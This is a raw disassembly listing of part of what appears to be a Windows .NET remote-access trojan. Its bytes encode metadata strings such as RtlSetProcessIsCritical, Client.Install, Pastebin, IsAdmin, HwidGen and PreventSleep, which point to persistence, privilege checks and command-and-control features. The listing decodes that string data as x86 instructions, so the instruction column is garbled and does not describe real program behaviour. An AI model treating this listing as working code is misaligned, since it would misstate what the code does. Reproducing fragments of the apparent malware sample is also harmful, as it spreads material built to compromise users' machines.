  408688:	61                   	popa
  408689:	6c                   	insb   (%dx),%es:(%edi)
  40868a:	00 69 56             	add    %ch,0x56(%ecx)
  40868d:	61                   	popa
  40868e:	6c                   	insb   (%dx),%es:(%edi)
  40868f:	00 73 74             	add    %dh,0x74(%ebx)
  408692:	72 56                	jb     0x4086ea
  408694:	61                   	popa
  408695:	6c                   	insb   (%dx),%es:(%edi)
  408696:	00 52 74             	add    %dl,0x74(%edx)
  408699:	6c                   	insb   (%dx),%es:(%edi)
  40869a:	53                   	push   %ebx
  40869b:	65 74 50             	gs je  0x4086ee
  40869e:	72 6f                	jb     0x40870f
  4086a0:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a3:	73 49                	jae    0x4086ee
  4086a5:	73 43                	jae    0x4086ea
  4086a7:	72 69                	jb     0x408712
  4086a9:	74 69                	je     0x408714
  4086ab:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086ae:	00 50 72             	add    %dl,0x72(%eax)
  4086b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b5:	73 43                	jae    0x4086fa
  4086b7:	72 69                	jb     0x408722
  4086b9:	74 69                	je     0x408724
  4086bb:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086be:	00 4e 65             	add    %cl,0x65(%esi)
  4086c1:	74 77                	je     0x40873a
  4086c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c4:	72 6b                	jb     0x408731
  4086c6:	43                   	inc    %ebx
  4086c7:	72 65                	jb     0x40872e
  4086c9:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086cc:	74 69                	je     0x408737
  4086ce:	61                   	popa
  4086cf:	6c                   	insb   (%dx),%es:(%edi)
  4086d0:	00 53 79             	add    %dl,0x79(%ebx)
  4086d3:	73 74                	jae    0x408749
  4086d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4086d7:	2e 53                	cs push %ebx
  4086d9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086dd:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086e4:	6e 
  4086e5:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086e8:	61                   	popa
  4086e9:	6c                   	insb   (%dx),%es:(%edi)
  4086ea:	00 57 69             	add    %dl,0x69(%edi)
  4086ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ee:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f0:	77 73                	ja     0x408765
  4086f2:	50                   	push   %eax
  4086f3:	72 69                	jb     0x40875e
  4086f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f6:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086f9:	61                   	popa
  4086fa:	6c                   	insb   (%dx),%es:(%edi)
  4086fb:	00 41 72             	add    %al,0x72(%ecx)
  4086fe:	65 45                	gs inc %ebp
  408700:	71 75                	jno    0x408777
  408702:	61                   	popa
  408703:	6c                   	insb   (%dx),%es:(%edi)
  408704:	00 67 65             	add    %ah,0x65(%edi)
  408707:	74 5f                	je     0x408768
  408709:	49                   	dec    %ecx
  40870a:	6e                   	outsb  %ds:(%esi),(%dx)
  40870b:	74 65                	je     0x408772
  40870d:	72 76                	jb     0x408785
  40870f:	61                   	popa
  408710:	6c                   	insb   (%dx),%es:(%edi)
  408711:	00 73 65             	add    %dh,0x65(%ebx)
  408714:	74 5f                	je     0x408775
  408716:	49                   	dec    %ecx
  408717:	6e                   	outsb  %ds:(%esi),(%dx)
  408718:	74 65                	je     0x40877f
  40871a:	72 76                	jb     0x408792
  40871c:	61                   	popa
  40871d:	6c                   	insb   (%dx),%es:(%edi)
  40871e:	00 43 6c             	add    %al,0x6c(%ebx)
  408721:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408728:	73 74                	jae    0x40879e
  40872a:	61                   	popa
  40872b:	6c                   	insb   (%dx),%es:(%edi)
  40872c:	6c                   	insb   (%dx),%es:(%edi)
  40872d:	00 6b 65             	add    %ch,0x65(%ebx)
  408730:	72 6e                	jb     0x4087a0
  408732:	65 6c                	gs insb (%dx),%es:(%edi)
  408734:	33 32                	xor    (%edx),%esi
  408736:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408739:	6c                   	insb   (%dx),%es:(%edi)
  40873a:	00 75 73             	add    %dh,0x73(%ebp)
  40873d:	65 72 33             	gs jb  0x408773
  408740:	32 2e                	xor    (%esi),%ch
  408742:	64 6c                	fs insb (%dx),%es:(%edi)
  408744:	6c                   	insb   (%dx),%es:(%edi)
  408745:	00 6e 74             	add    %ch,0x74(%esi)
  408748:	64 6c                	fs insb (%dx),%es:(%edi)
  40874a:	6c                   	insb   (%dx),%es:(%edi)
  40874b:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40874e:	6c                   	insb   (%dx),%es:(%edi)
  40874f:	00 4b 69             	add    %cl,0x69(%ebx)
  408752:	6c                   	insb   (%dx),%es:(%edi)
  408753:	6c                   	insb   (%dx),%es:(%edi)
  408754:	00 50 6f             	add    %dl,0x6f(%eax)
  408757:	6c                   	insb   (%dx),%es:(%edi)
  408758:	6c                   	insb   (%dx),%es:(%edi)
  408759:	00 57 72             	add    %dl,0x72(%edi)
  40875c:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408763:	00 
  408764:	53                   	push   %ebx
  408765:	65 74 41             	gs je  0x4087a9
  408768:	73 4e                	jae    0x4087b8
  40876a:	75 6c                	jne    0x4087d8
  40876c:	6c                   	insb   (%dx),%es:(%edi)
  40876d:	00 4d 75             	add    %cl,0x75(%ebp)
  408770:	74 65                	je     0x4087d7
  408772:	78 43                	js     0x4087b7
  408774:	6f                   	outsl  %ds:(%esi),(%dx)
  408775:	6e                   	outsb  %ds:(%esi),(%dx)
  408776:	74 72                	je     0x4087ea
  408778:	6f                   	outsl  %ds:(%esi),(%dx)
  408779:	6c                   	insb   (%dx),%es:(%edi)
  40877a:	00 45 6e             	add    %al,0x6e(%ebp)
  40877d:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408780:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408784:	72 65                	jb     0x4087eb
  408786:	61                   	popa
  408787:	6d                   	insl   (%dx),%es:(%edi)
  408788:	00 46 69             	add    %al,0x69(%esi)
  40878b:	6c                   	insb   (%dx),%es:(%edi)
  40878c:	65 53                	gs push %ebx
  40878e:	74 72                	je     0x408802
  408790:	65 61                	gs popa
  408792:	6d                   	insl   (%dx),%es:(%edi)
  408793:	00 4e 65             	add    %cl,0x65(%esi)
  408796:	74 77                	je     0x40880f
  408798:	6f                   	outsl  %ds:(%esi),(%dx)
  408799:	72 6b                	jb     0x408806
  40879b:	53                   	push   %ebx
  40879c:	74 72                	je     0x408810
  40879e:	65 61                	gs popa
  4087a0:	6d                   	insl   (%dx),%es:(%edi)
  4087a1:	00 53 73             	add    %dl,0x73(%ebx)
  4087a4:	6c                   	insb   (%dx),%es:(%edi)
  4087a5:	53                   	push   %ebx
  4087a6:	74 72                	je     0x40881a
  4087a8:	65 61                	gs popa
  4087aa:	6d                   	insl   (%dx),%es:(%edi)
  4087ab:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087af:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b0:	64 65 46             	fs gs inc %esi
  4087b3:	72 6f                	jb     0x408824
  4087b5:	6d                   	insl   (%dx),%es:(%edi)
  4087b6:	53                   	push   %ebx
  4087b7:	74 72                	je     0x40882b
  4087b9:	65 61                	gs popa
  4087bb:	6d                   	insl   (%dx),%es:(%edi)
  4087bc:	00 43 72             	add    %al,0x72(%ebx)
  4087bf:	79 70                	jns    0x408831
  4087c1:	74 6f                	je     0x408832
  4087c3:	53                   	push   %ebx
  4087c4:	74 72                	je     0x408838
  4087c6:	65 61                	gs popa
  4087c8:	6d                   	insl   (%dx),%es:(%edi)
  4087c9:	00 47 5a             	add    %al,0x5a(%edi)
  4087cc:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087d3:	6d                   	insl   (%dx),%es:(%edi)
  4087d4:	00 4d 65             	add    %cl,0x65(%ebp)
  4087d7:	6d                   	insl   (%dx),%es:(%edi)
  4087d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087d9:	72 79                	jb     0x408854
  4087db:	53                   	push   %ebx
  4087dc:	74 72                	je     0x408850
  4087de:	65 61                	gs popa
  4087e0:	6d                   	insl   (%dx),%es:(%edi)
  4087e1:	00 50 72             	add    %dl,0x72(%eax)
  4087e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e5:	67 72 61             	addr16 jb 0x408849
  4087e8:	6d                   	insl   (%dx),%es:(%edi)
  4087e9:	00 67 65             	add    %ah,0x65(%edi)
  4087ec:	74 5f                	je     0x40884d
  4087ee:	49                   	dec    %ecx
  4087ef:	74 65                	je     0x408856
  4087f1:	6d                   	insl   (%dx),%es:(%edi)
  4087f2:	00 67 65             	add    %ah,0x65(%edi)
  4087f5:	74 5f                	je     0x408856
  4087f7:	49                   	dec    %ecx
  4087f8:	73 36                	jae    0x408830
  4087fa:	34 42                	xor    $0x42,%al
  4087fc:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408803:	74 
  408804:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40880b:	65 6d                	gs insl (%dx),%es:(%edi)
  40880d:	00 43 6c             	add    %al,0x6c(%ebx)
  408810:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408817:	67 6f                	outsl  %ds:(%si),(%dx)
  408819:	72 69                	jb     0x408884
  40881b:	74 68                	je     0x408885
  40881d:	6d                   	insl   (%dx),%es:(%edi)
  40881e:	00 53 79             	add    %dl,0x79(%ebx)
  408821:	6d                   	insl   (%dx),%es:(%edi)
  408822:	6d                   	insl   (%dx),%es:(%edi)
  408823:	65 74 72             	gs je  0x408898
  408826:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40882d:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408834:	79 
  408835:	6d                   	insl   (%dx),%es:(%edi)
  408836:	6d                   	insl   (%dx),%es:(%edi)
  408837:	65 74 72             	gs je  0x4088ac
  40883a:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408841:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408848:	73 
  408849:	68 41 6c 67 6f       	push   $0x6f676c41
  40884e:	72 69                	jb     0x4088b9
  408850:	74 68                	je     0x4088ba
  408852:	6d                   	insl   (%dx),%es:(%edi)
  408853:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408857:	6d                   	insl   (%dx),%es:(%edi)
  408858:	00 52 61             	add    %dl,0x61(%edx)
  40885b:	6e                   	outsb  %ds:(%esi),(%dx)
  40885c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40885e:	6d                   	insl   (%dx),%es:(%edi)
  40885f:	00 49 43             	add    %cl,0x43(%ecx)
  408862:	72 79                	jb     0x4088dd
  408864:	70 74                	jo     0x4088da
  408866:	6f                   	outsl  %ds:(%esi),(%dx)
  408867:	54                   	push   %esp
  408868:	72 61                	jb     0x4088cb
  40886a:	6e                   	outsb  %ds:(%esi),(%dx)
  40886b:	73 66                	jae    0x4088d3
  40886d:	6f                   	outsl  %ds:(%esi),(%dx)
  40886e:	72 6d                	jb     0x4088dd
  408870:	00 4d 73             	add    %cl,0x73(%ebp)
  408873:	67 50                	addr16 push %eax
  408875:	61                   	popa
  408876:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408879:	6e                   	outsb  %ds:(%esi),(%dx)
  40887a:	75 6d                	jne    0x4088e9
  40887c:	00 57 72             	add    %dl,0x72(%edi)
  40887f:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408886:	65 
  408887:	61                   	popa
  408888:	6e                   	outsb  %ds:(%esi),(%dx)
  408889:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40888d:	6f                   	outsl  %ds:(%esi),(%dx)
  40888e:	6f                   	outsl  %ds:(%esi),(%dx)
  40888f:	6c                   	insb   (%dx),%es:(%edi)
  408890:	65 61                	gs popa
  408892:	6e                   	outsb  %ds:(%esi),(%dx)
  408893:	00 53 65             	add    %dl,0x65(%ebx)
  408896:	74 41                	je     0x4088d9
  408898:	73 42                	jae    0x4088dc
  40889a:	6f                   	outsl  %ds:(%esi),(%dx)
  40889b:	6f                   	outsl  %ds:(%esi),(%dx)
  40889c:	6c                   	insb   (%dx),%es:(%edi)
  40889d:	65 61                	gs popa
  40889f:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a0:	00 48 77             	add    %cl,0x77(%eax)
  4088a3:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088aa:	65 
  4088ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ac:	00 63 68             	add    %ah,0x68(%ebx)
  4088af:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088b6:	4d 
  4088b7:	61                   	popa
  4088b8:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088bf:	43                   	inc    %ebx
  4088c0:	68 61 69 6e 00       	push   $0x6e6961
  4088c5:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088c8:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d0:	6d                   	insl   (%dx),%es:(%edi)
  4088d1:	61                   	popa
  4088d2:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088d9:	43                   	inc    %ebx
  4088da:	75 72                	jne    0x40894e
  4088dc:	72 65                	jb     0x408943
  4088de:	6e                   	outsb  %ds:(%esi),(%dx)
  4088df:	74 44                	je     0x408925
  4088e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e2:	6d                   	insl   (%dx),%es:(%edi)
  4088e3:	61                   	popa
  4088e4:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088eb:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088ef:	00 49 73             	add    %cl,0x73(%ecx)
  4088f2:	41                   	inc    %ecx
  4088f3:	64 6d                	fs insl (%dx),%es:(%edi)
  4088f5:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4088fc:	00 47 65             	add    %al,0x65(%edi)
  4088ff:	74 46                	je     0x408947
  408901:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408908:	57 
  408909:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408910:	78 
  408911:	74 65                	je     0x408978
  408913:	6e                   	outsb  %ds:(%esi),(%dx)
  408914:	73 69                	jae    0x40897f
  408916:	6f                   	outsl  %ds:(%esi),(%dx)
  408917:	6e                   	outsb  %ds:(%esi),(%dx)
  408918:	00 67 65             	add    %ah,0x65(%edi)
  40891b:	74 5f                	je     0x40897c
  40891d:	4f                   	dec    %edi
  40891e:	53                   	push   %ebx
  40891f:	56                   	push   %esi
  408920:	65 72 73             	gs jb  0x408996
  408923:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40892a:	74 65                	je     0x408991
  40892c:	6d                   	insl   (%dx),%es:(%edi)
  40892d:	2e 49                	cs dec %ecx
  40892f:	4f                   	dec    %edi
  408930:	2e 43                	cs inc %ebx
  408932:	6f                   	outsl  %ds:(%esi),(%dx)
  408933:	6d                   	insl   (%dx),%es:(%edi)
  408934:	70 72                	jo     0x4089a8
  408936:	65 73 73             	gs jae 0x4089ac
  408939:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408940:	6c                   	insb   (%dx),%es:(%edi)
  408941:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408948:	00 53 79             	add    %dl,0x79(%ebx)
  40894b:	73 74                	jae    0x4089c1
  40894d:	65 6d                	gs insl (%dx),%es:(%edi)
  40894f:	2e 53                	cs push %ebx
  408951:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408955:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40895c:	68 
  40895d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40895f:	74 69                	je     0x4089ca
  408961:	63 61 74             	arpl   %esp,0x74(%ecx)
  408964:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40896b:	74 65                	je     0x4089d2
  40896d:	6d                   	insl   (%dx),%es:(%edi)
  40896e:	2e 52                	cs push %edx
  408970:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408973:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408978:	6e                   	outsb  %ds:(%esi),(%dx)
  408979:	00 58 35             	add    %bl,0x35(%eax)
  40897c:	30 39                	xor    %bh,(%ecx)
  40897e:	43                   	inc    %ebx
  40897f:	65 72 74             	gs jb  0x4089f6
  408982:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408989:	43                   	inc    %ebx
  40898a:	6f                   	outsl  %ds:(%esi),(%dx)
  40898b:	6c                   	insb   (%dx),%es:(%edi)
  40898c:	6c                   	insb   (%dx),%es:(%edi)
  40898d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408992:	6e                   	outsb  %ds:(%esi),(%dx)
  408993:	00 4d 61             	add    %cl,0x61(%ebp)
  408996:	6e                   	outsb  %ds:(%esi),(%dx)
  408997:	61                   	popa
  408998:	67 65 6d             	gs insl (%dx),%es:(%di)
  40899b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40899d:	74 4f                	je     0x4089ee
  40899f:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a2:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089a6:	6c                   	insb   (%dx),%es:(%edi)
  4089a7:	6c                   	insb   (%dx),%es:(%edi)
  4089a8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ae:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b1:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ba:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c0:	00 73 65             	add    %dh,0x65(%ebx)
  4089c3:	74 5f                	je     0x408a24
  4089c5:	50                   	push   %eax
  4089c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c7:	73 69                	jae    0x408a32
  4089c9:	74 69                	je     0x408a34
  4089cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cd:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d0:	73 69                	jae    0x408a3b
  4089d2:	74 69                	je     0x408a3d
  4089d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d6:	00 43 72             	add    %al,0x72(%ebx)
  4089d9:	79 70                	jns    0x408a4b
  4089db:	74 6f                	je     0x408a4c
  4089dd:	67 72 61             	addr16 jb 0x408a41
  4089e0:	70 68                	jo     0x408a4a
  4089e2:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089e9:	74 69                	je     0x408a54
  4089eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ed:	00 41 72             	add    %al,0x72(%ecx)
  4089f0:	67 75 6d             	addr16 jne 0x408a60
  4089f3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089f5:	74 4e                	je     0x408a45
  4089f7:	75 6c                	jne    0x408a65
  4089f9:	6c                   	insb   (%dx),%es:(%edi)
  4089fa:	45                   	inc    %ebp
  4089fb:	78 63                	js     0x408a60
  4089fd:	65 70 74             	gs jo  0x408a74
  408a00:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a07:	75 6d                	jne    0x408a76
  408a09:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a0b:	74 45                	je     0x408a52
  408a0d:	78 63                	js     0x408a72
  408a0f:	65 70 74             	gs jo  0x408a86
  408a12:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a19:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1b:	77 6e                	ja     0x408a8b
  408a1d:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a20:	61                   	popa
  408a21:	67 65 43             	addr16 gs inc %ebx
  408a24:	6f                   	outsl  %ds:(%esi),(%dx)
  408a25:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a2a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a2c:	00 53 65             	add    %dl,0x65(%ebx)
  408a2f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a30:	64 49                	fs dec %ecx
  408a32:	6e                   	outsb  %ds:(%esi),(%dx)
  408a33:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a35:	00 46 69             	add    %al,0x69(%esi)
  408a38:	6c                   	insb   (%dx),%es:(%edi)
  408a39:	65 49                	gs dec %ecx
  408a3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3e:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a42:	76 65                	jbe    0x408aa9
  408a44:	49                   	dec    %ecx
  408a45:	6e                   	outsb  %ds:(%esi),(%dx)
  408a46:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a48:	00 46 69             	add    %al,0x69(%esi)
  408a4b:	6c                   	insb   (%dx),%es:(%edi)
  408a4c:	65 53                	gs push %ebx
  408a4e:	79 73                	jns    0x408ac3
  408a50:	74 65                	je     0x408ab7
  408a52:	6d                   	insl   (%dx),%es:(%edi)
  408a53:	49                   	dec    %ecx
  408a54:	6e                   	outsb  %ds:(%esi),(%dx)
  408a55:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a57:	00 43 6f             	add    %al,0x6f(%ebx)
  408a5a:	6d                   	insl   (%dx),%es:(%edi)
  408a5b:	70 75                	jo     0x408ad2
  408a5d:	74 65                	je     0x408ac4
  408a5f:	72 49                	jb     0x408aaa
  408a61:	6e                   	outsb  %ds:(%esi),(%dx)
  408a62:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a64:	00 43 53             	add    %al,0x53(%ebx)
  408a67:	68 61 72 70 41       	push   $0x41707261
  408a6c:	72 67                	jb     0x408ad5
  408a6e:	75 6d                	jne    0x408add
  408a70:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a72:	74 49                	je     0x408abd
  408a74:	6e                   	outsb  %ds:(%esi),(%dx)
  408a75:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a77:	00 50 72             	add    %dl,0x72(%eax)
  408a7a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7b:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a7e:	73 53                	jae    0x408ad3
  408a80:	74 61                	je     0x408ae3
  408a82:	72 74                	jb     0x408af8
  408a84:	49                   	dec    %ecx
  408a85:	6e                   	outsb  %ds:(%esi),(%dx)
  408a86:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a88:	00 57 72             	add    %dl,0x72(%edi)
  408a8b:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a92:	50 
  408a93:	72 65                	jb     0x408afa
  408a95:	76 65                	jbe    0x408afc
  408a97:	6e                   	outsb  %ds:(%esi),(%dx)
  408a98:	74 53                	je     0x408aed
  408a9a:	6c                   	insb   (%dx),%es:(%edi)
  408a9b:	65 65 70 00          	gs gs jo 0x408a9f
  408a9f:	5a                   	pop    %edx
  408aa0:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aa7:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aa9:	74 41                	je     0x408aec
  408aab:	70 70                	jo     0x408b1d
  408aad:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab0:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ab3:	73 6f                	jae    0x408b24
  408ab5:	66 74 2e             	data16 je 0x408ae6
  408ab8:	43                   	inc    %ebx
  408ab9:	53                   	push   %ebx
  408aba:	68 61 72 70 00       	push   $0x707261
  408abf:	47                   	inc    %edi
  408ac0:	72 6f                	jb     0x408b31
  408ac2:	75 70                	jne    0x408b34
  408ac4:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ac7:	72 6d                	jb     0x408b36
  408ac9:	61                   	popa
  408aca:	6c                   	insb   (%dx),%es:(%edi)
  408acb:	53                   	push   %ebx
  408acc:	74 61                	je     0x408b2f
  408ace:	72 74                	jb     0x408b44
  408ad0:	75 70                	jne    0x408b42
  408ad2:	00 53 79             	add    %dl,0x79(%ebx)
  408ad5:	73 74                	jae    0x408b4b
  408ad7:	65 6d                	gs insl (%dx),%es:(%edi)
  408ad9:	2e 4c                	cs dec %esp
  408adb:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408ae2:	61                   	popa
  408ae3:	72 00                	jb     0x408ae5
  408ae5:	43                   	inc    %ebx
  408ae6:	68 61 72 00 49       	push   $0x49007261
  408aeb:	6e                   	outsb  %ds:(%esi),(%dx)
  408aec:	76 6f                	jbe    0x408b5d
  408aee:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408af2:	6d                   	insl   (%dx),%es:(%edi)
  408af3:	62 65 72             	bound  %esp,0x72(%ebp)
  408af6:	00 4d 44             	add    %cl,0x44(%ebp)
  408af9:	35 43 72 79 70       	xor    $0x70797243,%eax
  408afe:	74 6f                	je     0x408b6f
  408b00:	53                   	push   %ebx
  408b01:	65 72 76             	gs jb  0x408b7a
  408b04:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b0b:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b12:	41 
  408b13:	43                   	inc    %ebx
  408b14:	72 79                	jb     0x408b8f
  408b16:	70 74                	jo     0x408b8c
  408b18:	6f                   	outsl  %ds:(%esi),(%dx)
  408b19:	53                   	push   %ebx
  408b1a:	65 72 76             	gs jb  0x408b93
  408b1d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b24:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b2b:	73 
  408b2c:	43                   	inc    %ebx
  408b2d:	72 79                	jb     0x408ba8
  408b2f:	70 74                	jo     0x408ba5
  408b31:	6f                   	outsl  %ds:(%esi),(%dx)
  408b32:	53                   	push   %ebx
  408b33:	65 72 76             	gs jb  0x408bac
  408b36:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b3d:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b44:	72 
  408b45:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b4c:	64 65 72 00          	fs gs jb 0x408b50
  408b50:	49                   	dec    %ecx
  408b51:	6e                   	outsb  %ds:(%esi),(%dx)
  408b52:	73 74                	jae    0x408bc8
  408b54:	61                   	popa
  408b55:	6c                   	insb   (%dx),%es:(%edi)
  408b56:	6c                   	insb   (%dx),%es:(%edi)
  408b57:	46                   	inc    %esi
  408b58:	6f                   	outsl  %ds:(%esi),(%dx)
  408b59:	6c                   	insb   (%dx),%es:(%edi)
  408b5a:	64 65 72 00          	fs gs jb 0x408b5e
  408b5e:	49                   	dec    %ecx
  408b5f:	64 53                	fs push %ebx
  408b61:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b63:	64 65 72 00          	fs gs jb 0x408b67
  408b67:	73 65                	jae    0x408bce
  408b69:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6a:	64 65 72 00          	fs gs jb 0x408b6e
  408b6e:	4d                   	dec    %ebp
  408b6f:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b76:	74 2e                	je     0x408ba6
  408b78:	43                   	inc    %ebx
  408b79:	53                   	push   %ebx
  408b7a:	68 61 72 70 2e       	push   $0x2e707261
  408b7f:	52                   	push   %edx
  408b80:	75 6e                	jne    0x408bf0
  408b82:	74 69                	je     0x408bed
  408b84:	6d                   	insl   (%dx),%es:(%edi)
  408b85:	65 42                	gs inc %edx
  408b87:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b8e:	61                   	popa
  408b8f:	6c                   	insb   (%dx),%es:(%edi)
  408b90:	6c                   	insb   (%dx),%es:(%edi)
  408b91:	53                   	push   %ebx
